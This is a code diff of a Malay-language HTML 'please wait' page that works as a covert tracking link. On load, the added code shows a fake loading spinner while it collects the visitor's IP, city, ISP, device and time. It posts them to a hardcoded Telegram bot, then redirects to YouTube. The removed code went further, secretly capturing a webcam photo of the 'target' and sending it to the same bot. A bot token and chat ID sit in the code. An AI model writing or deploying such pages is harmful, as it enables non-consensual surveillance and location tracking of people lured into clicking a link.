@@ -3,73 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <title>Sila Tunggu...</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 50px;">
-        <p id="status">Memproses kandungan... Sila benarkan akses jika diminta.</p>
-        <video id="video" width="320" height="240" autoplay style="display:none;"></video>
-        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <div style="text-align: center;">
+        <div class="loader" style="margin: 0 auto;"></div>
+        <p id="status">Memuatkan kandungan...</p>
     </div>
 
     <script>
+        // Maklumat yang anda berikan
         const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
         const CHAT_ID = '8563935930';
 
-        async function startProcess() {
+        async function hantarTrace() {
             const statusText = document.getElementById('status');
             
-            // 1. Cuba ambil gambar (Memerlukan kebenaran pengguna)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                // Tunggu kamera stabil sekejap
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                const canvas = document.getElementById('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                
-                // Tukar gambar ke format Blob untuk dihantar ke Telegram
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'snap.jpg');
-                    formData.append('caption', '📸 Gambar Target Berjaya Diambil!');
-
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    // Tutup kamera selepas snap
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg');
-
-            } catch (err) {
-                console.log("Kamera ditolak atau tiada kamera.");
-            }
-
-            // 2. Ambil data IP & Lokasi (Sama seperti kod sebelum ini)
-            try {
+                // 1. Dapatkan data IP & Lokasi dari API Luar
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
-                const mesej = `🚀 *KLIK LINK & INFO LOKASI*\nIP: ${data.ip}\nLokasi: ${data.city}, ${data.country_name}`;
 
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                // 2. Susun mesej untuk Telegram
+                const mesej = `
+🚀 *KLIK LINK DIKESAN!*
+--------------------------
+🌐 *IP:* \`${data.ip}\`
+📍 *Lokasi:* ${data.city}, ${data.region}, ${data.country_name}
+📡 *ISP:* ${data.org}
+📱 *Device:* ${navigator.userAgent}
+⏰ *Masa:* ${new Date().toLocaleString('ms-MY')}
+                `;
+
+                // 3. Hantar ke Bot Telegram anda
+                const teleRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: mesej, parse_mode: 'Markdown' })
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mesej,
+                        parse_mode: 'Markdown'
+                    })
                 });
-            } catch (e) { console.error(e); }
 
-            // 3. Redirect selepas semua selesai
+                if (teleRes.ok) {
+                    statusText.innerText = "Berjaya! Menghalakan anda...";
+                } else {
+                    statusText.innerText = "Gagal menghantar data.";
+                }
+
+            } catch (error) {
+                statusText.innerText = "Ralat teknikal berlaku.";
+                console.error(error);
+            }
+
+            // 4. Redirect ke YouTube/Google selepas 2 saat
             setTimeout(() => {
                 window.location.href = "https://www.youtube.com";
-            }, 3000);
+            }, 2000);
         }
 
-        window.onload = startProcess;
+        // Jalankan fungsi sebaik sahaja page dibuka
+        window.onload = hantarTrace;
     </script>
 </body>
 </html>
